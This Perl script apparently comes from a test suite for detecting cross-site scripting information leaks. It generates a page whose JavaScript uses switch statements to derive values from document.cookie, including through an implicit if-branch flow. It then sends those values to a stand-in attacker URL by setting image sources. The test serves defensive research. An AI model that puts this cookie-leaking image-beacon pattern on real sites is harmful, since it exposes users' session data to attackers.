#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_LOOKUPSWITCH";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = "z";
		}
		var notevil = "z";
		var notevil2 = "z";
		var notevil3 = "z";
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
		switch ( notevil ) {
			case "z": dut = 2;
				break;
			default:
				 dut = 3;
			break;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			switch ( notevil2 ) {
				case "z": dut2 = 2;
					break;
				default:
					 dut2 = 3;
				break;
			}
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		switch ( evil ) {
			case "z": dut3 = 2;
				break;
			default:
				 dut3 = 3;
			break;
		}
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
